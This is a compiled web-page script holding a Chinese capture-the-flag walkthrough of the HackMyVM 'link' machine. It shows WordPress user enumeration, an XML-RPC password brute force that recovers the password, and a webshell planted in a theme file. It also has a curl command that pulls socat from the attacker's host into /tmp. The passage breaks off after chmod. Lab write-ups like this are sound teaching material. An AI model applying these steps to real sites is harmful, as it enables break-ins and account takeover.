(window.webpackJsonp=window.webpackJsonp||[]).push([[137],{501:function(s,a,t){"use strict";t.r(a);var n=t(11),e=Object(n.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h2",{attrs:{id:"信息收集"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#信息收集"}},[s._v("#")]),s._v(" 信息收集")]),s._v(" "),a("p",[s._v("端口扫描")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/hackmyvm/link"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ nmap "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-sT")]),s._v(" -p- "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".56.164\nPORT   STATE SERVICE\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("80")]),s._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  http\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[s._v("访问80端口，一个wordpress站点")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/link/1.png",alt:""}})]),s._v(" "),a("p",[s._v("wpscan扫描")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/hackmyvm/link"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ wpscan "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--url")]),s._v(" http://192.168.56.112/ \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("+"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" XML-RPC seems to be enabled: http://192.168.56.112/xmlrpc.php\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("+"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" WordPress version "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6.7")]),s._v(" identified "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Insecure, released on "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2024")]),s._v("-11-12"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(".\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("i"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" No plugins Found.\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[s._v("3条重要信息：")]),s._v(" "),a("ul",[a("li",[s._v("XML-RPC enabled")]),s._v(" "),a("li",[s._v("wordpress version 6.7")]),s._v(" "),a("li",[s._v("No plugins Found.")])]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/link/2.png",alt:""}})]),s._v(" "),a("p",[s._v("wpscan爆破一下用户，然后可以尝试利用xmlrpc接口来爆破密码")]),s._v(" "),a("p",[s._v("发现用户：yliken")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/hackmyvm/link"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ wpscan "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--url")]),s._v(" http://192.168.56.164/ "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--enumerate")]),s._v(" u\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("+"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Enumerating Users "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("via Passive and Aggressive Methods"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n Brute Forcing Author IDs - Time: 00:00:01 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10")]),s._v(" / "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("100.00")]),s._v("% Time: 00:00:01\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("i"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" User"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("s"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" Identified:\n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("+"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Yliken\n "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Found By: Rss Generator "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Passive Detection"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("+"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" yliken\n "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Found By: Wp Json Api "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Aggressive Detection"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("  - http://192.168.56.164/index.php/wp-json/wp/v2/users/?per_page"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("100")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("page")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\n "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Confirmed By: Author Id Brute Forcing - Author Pattern "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Aggressive Detection"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br")])]),a("p",[s._v("爆破密码出密码：ichliebedich")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/hackmyvm/link"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ wpscan "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--url")]),s._v(" http://192.168.56.164/ "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-U")]),s._v(" yliken "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-P")]),s._v(" /usr/share/wordlists/rockyou.txt --password-attack xmlrpc "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-t")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("50")]),s._v("\n \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("+"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Performing password attack on Xmlrpc against "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" user/s\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("SUCCESS"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" - yliken / ichliebedich\nTrying yliken / chevy1 Time: 00:01:56 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("                                                                                                                               "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5000")]),s._v(" / "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("14349392")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.03")]),s._v("%  ETA: ??:??:??\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Valid Combinations Found:\n "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Username: yliken, Password: ichliebedich\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("h2",{attrs:{id:"wordpress后台getshell"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#wordpress后台getshell"}},[s._v("#")]),s._v(" wordpress后台getshell")]),s._v(" "),a("p",[s._v("访问 wp-login.php，进入后台，编辑主题文件")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/link/3.png",alt:""}})]),s._v(" "),a("p",[s._v("修改patterns/header.php，写入webshell")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/link/4.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/link/5.png",alt:""}})]),s._v(" "),a("p",[s._v("保存以后，回到文章列表，访问helloworld的那篇文章")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/link/6.png",alt:""}})]),s._v(" "),a("p",[s._v("蚁剑连接")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/link/7.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"yliken用户登录"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#yliken用户登录"}},[s._v("#")]),s._v(" yliken用户登录")]),s._v(" "),a("p",[s._v("信息收集，没有suid命令，内网有8080端口，没有对外开放")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("www-data:/var/www/html"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" $ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-l")]),s._v("\nsudo: unable to resolve "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("host")]),s._v(" link: Temporary failure "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" name resolution\nWe trust you have received the usual lecture from the "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("local")]),s._v(" System\nAdministrator. It usually boils down to these three things:\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#1) Respect the privacy of others.")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#2) Think before you type.")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#3) With great power comes great responsibility.")]),s._v("\nsudo: a terminal is required to "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("read")]),s._v(" the password"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" either use the "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-S")]),s._v(" option to "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("read")]),s._v(" from standard input or configure an askpass helper\nsudo: a password is required\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("www-data:/var/www/html"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" $ ss "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-tulpn")]),s._v("\nNetid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port\nudp     UNCONN   "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("        "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("                "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.0")]),s._v(".0.0:68            "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.0")]),s._v(".0.0:*\ntcp     LISTEN   "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("        "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("80")]),s._v("             "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1:3306          "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.0")]),s._v(".0.0:*\ntcp     LISTEN   "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("        "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("128")]),s._v("            "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1:8080          "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.0")]),s._v(".0.0:*\ntcp     LISTEN   "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("        "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("128")]),s._v("              "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.0")]),s._v(".0.0:22            "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.0")]),s._v(".0.0:*\ntcp     LISTEN   "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("        "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("128")]),s._v("                    *:80                  *:*\ntcp     LISTEN   "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("        "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("128")]),s._v("                 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("::"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(":22               "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("::"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(":*\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br")])]),a("p",[s._v("查看进程，有mysql服务和yliken的一个文件浏览服务。mysql密码可以在wordpress配置文件里找到，没什么权限，没有必要")]),s._v(" "),a("p",[s._v("重点看看yliken进程，如果有漏洞，就可以尝试拿到yliken用户权限")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("www-data:/var/www/html"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" $ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ps")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-aux")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token environment constant"}},[s._v("USER")]),s._v("         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nyliken       "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("322")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.0")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.3")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1231760")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("7700")]),s._v(" ?        Ssl  06:08   "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(":00 /home/yliken/fileBrower\nmysql        "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("431")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("8.2")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5.2")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1103328")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("107892")]),s._v(" ?      Ssl  06:08   "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(":21 /usr/sbin/mariadbd\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("下载远程socat")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("www-data:/var/www/html"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" $ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),s._v(" http://192.168.56.107/socat "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" /tmp/socat\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("     "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("    "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("     "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("    "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("     "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("      "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("      "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(" --:--:-- --:--:-- --:--:--     "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("100")]),s._v("  366k  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("100")]),s._v("  366k    "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("     "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("  3700k      "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(" --:--:-- --:--:-- --:--:-- 3700k\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("www-data:/var/www/html"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" $ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v(" /tmp "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-lah")]),s._v("\ntotal 404K\ndrwxrwxrwt  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" root     root     "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(".0K Oct "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("30")]),s._v(" 06:29 "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(".")]),s._v("\ndrwxr-xr-x "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("19")]),s._v(" root     root     "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(".0K Oct "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("28")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("12")]),s._v(":17 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v("\n-rw-------  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" www-data www-data  27K Oct "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("30")]),s._v(" 06:29 phpcts27x\n-rw-r--r--  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" www-data www-data 367K Oct "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("30")]),s._v(" 06:28 socat\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("www-data:/var/www/html"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" $ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),s._v(" +x /tmp/socat\n")])]),s._v(" 